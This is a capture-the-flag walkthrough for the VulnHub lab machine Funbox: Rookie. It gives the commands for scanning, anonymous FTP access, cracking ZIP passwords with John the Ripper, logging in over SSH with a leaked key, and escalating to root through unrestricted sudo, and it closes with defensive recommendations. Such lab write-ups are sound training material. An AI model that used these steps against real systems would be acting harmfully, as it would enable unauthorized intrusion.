# Funbox: Rookie (VulnHub)

## Overview

**Funbox: Rookie** is an Easy-level VulnHub machine that demonstrates how anonymous FTP access, exposed encrypted archives, weak passwords, SSH private key disclosure, sensitive credential storage, and misconfigured sudo permissions can be chained together to achieve full system compromise.

This lab provides hands-on experience in network enumeration, FTP enumeration, ZIP password cracking, SSH authentication using private keys, Linux enumeration, and privilege escalation.

---

## Machine Information

| Attribute | Value |
|------------|---------|
| Machine Name | Funbox: Rookie |
| Platform | VulnHub |
| Difficulty | Easy |
| Target OS | Ubuntu Linux |
| Attacker Machine | Kali Linux |
| Main Vector | Anonymous FTP → ZIP Password Cracking → SSH Private Key → Credential Discovery → Sudo Privilege Escalation |
| Objective | Gain Root Access and Retrieve the Root Flag |

---

## Skills Demonstrated

- Network Discovery
- Host Enumeration
- Service Enumeration
- Nmap Scanning
- FTP Enumeration
- Anonymous FTP Access
- ZIP Password Cracking
- John the Ripper
- zip2john
- SSH Private Key Authentication
- Linux Enumeration
- Credential Harvesting
- Privilege Escalation
- Sudo Enumeration
- Post Exploitation

---

## Tools Used

- Netdiscover
- Nmap
- FTP
- zip2john
- John the Ripper
- SSH
- Linux Commands
- Kali Linux

---

## Attack Methodology

1. Discover the target machine.
2. Enumerate open services.
3. Access anonymous FTP.
4. Download exposed ZIP archives.
5. Crack ZIP archive password.
6. Extract the SSH private key.
7. Authenticate via SSH.
8. Enumerate user files.
9. Recover credentials from `.mysql_history`.
10. Verify sudo permissions.
11. Escalate privileges to root.
12. Retrieve the root flag.

---

## Network Discovery

Identify the target machine.

```bash
sudo netdiscover -i eth0
```

Result:

```text
192.168.10.20
```

The vulnerable machine was successfully identified on the local network.

---

## Service Enumeration

Run an Nmap scan.

```bash
sudo nmap -sC -sV 192.168.10.20 --min-rate 10000
```

### Open Ports

| Port | Service | Version |
|------|----------|---------|
| 21 | FTP | ProFTPD 1.3.5e |
| 22 | SSH | OpenSSH 7.6p1 Ubuntu |
| 80 | HTTP | Apache 2.4.29 |

### Important Findings

- Anonymous FTP login enabled
- SSH service available
- Apache web server running

---

## Anonymous FTP Enumeration

Connect to the FTP service.

```bash
ftp 192.168.10.20
```

Login:

```text
Username: anonymous
Password: anonymous
```

List files.

```bash
ls -la
```

Interesting files:

```text
anna.zip
ariel.zip
bud.zip
cathrine.zip
homer.zip
jessica.zip
john.zip
marge.zip
miriam.zip
tom.zip
zlatan.zip
.@admins
.@users
```

Download all archives.

```bash
mget *
```

---

## ZIP Password Cracking

Attempt to extract a ZIP archive.

```bash
unzip john.zip
```

The archive is password protected.

Extract the password hash.

```bash
zip2john tom.zip > tomhash.txt
```

Crack the password.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt tomhash.txt
```

Recovered password:

```text
iubire
```

---

## Extracting the SSH Private Key

Extract the archive.

```bash
unzip tom.zip
```

Password:

```text
iubire
```

Files extracted:

```text
id_rsa
```

Set correct permissions.

```bash
chmod 600 id_rsa
```

---

## Initial Access

Authenticate using the private key.

```bash
ssh tom@192.168.10.20 -i id_rsa
```

Verify access.

```bash
whoami
```

Output:

```text
tom
```

---

## Local Enumeration

Inspect hidden files.

```bash
ls -la
```

Interesting file discovered:

```text
.mysql_history
```

View contents.

```bash
cat .mysql_history
```

Recovered credential:

```text
xx11yy22!
```

The history file contained SQL commands revealing sensitive credentials.

---

## Privilege Escalation

Check sudo permissions.

```bash
sudo -l
```

Output:

```text
(ALL : ALL) ALL
```

Tom has unrestricted sudo privileges.

Switch to root.

```bash
sudo su root
```

Verify.

```bash
whoami
```

Output:

```text
root
```

Root privileges successfully obtained.

---

## Root Flag

Navigate to the root directory.

```bash
cd /root
```

Read the flag.

```bash
cat flag.txt
```

Flag:

```text
from @0815R2d2 with ♥
```

---

## Vulnerabilities Identified

### 1. Anonymous FTP Enabled

Unauthenticated users could access the FTP service.

### 2. Sensitive ZIP Archives Exposed

Confidential encrypted files were publicly accessible.

### 3. Weak ZIP Password

The archive password was easily cracked using John the Ripper.

### 4. SSH Private Key Disclosure

A valid SSH private key was exposed inside the ZIP archive.

### 5. Sensitive Credentials Stored in `.mysql_history`

Database history files exposed user credentials.

### 6. Misconfigured Sudo Permissions

The user had unrestricted sudo privileges, allowing immediate root access.

---

## Attack Chain Summary

- Network Discovery using Netdiscover
- Service Enumeration using Nmap
- Anonymous FTP Access
- Downloaded Exposed ZIP Archives
- ZIP Password Cracking with John the Ripper
- SSH Private Key Extraction
- SSH Authentication as Tom
- Linux Enumeration
- Credential Discovery from `.mysql_history`
- Sudo Enumeration
- Privilege Escalation
- Root Flag Retrieval

---

## Security Recommendations

- Disable anonymous FTP access.
- Restrict access to sensitive archives.
- Use strong passwords for encrypted files.
- Never expose SSH private keys.
- Remove sensitive credentials from history files.
- Limit sudo permissions following the principle of least privilege.
- Regularly audit user permissions and sensitive files.
- Enable centralized logging and monitoring for authentication events.
- Perform periodic security assessments.

---

## Key Learning Outcomes

- Anonymous FTP services can expose highly sensitive files.
- Password-protected archives are only as secure as their passwords.
- John the Ripper is an effective tool for recovering weak ZIP passwords.
- SSH private keys must be protected from unauthorized access.
- Local history files often contain valuable credentials.
- Misconfigured sudo permissions can lead directly to full system compromise.
- Thorough enumeration is essential for successful privilege escalation.

---

## Conclusion

Funbox: Rookie is an excellent beginner-friendly VulnHub machine that demonstrates the importance of securing FTP services, protecting encrypted archives, safeguarding SSH private keys, and enforcing least-privilege access. The attack path combines enumeration, password cracking, SSH authentication, local credential discovery, and privilege escalation into a realistic penetration testing scenario.

---

**Author:** Omkar Babaji Sawant

**Repository:** VulnHub-Walkthroughs
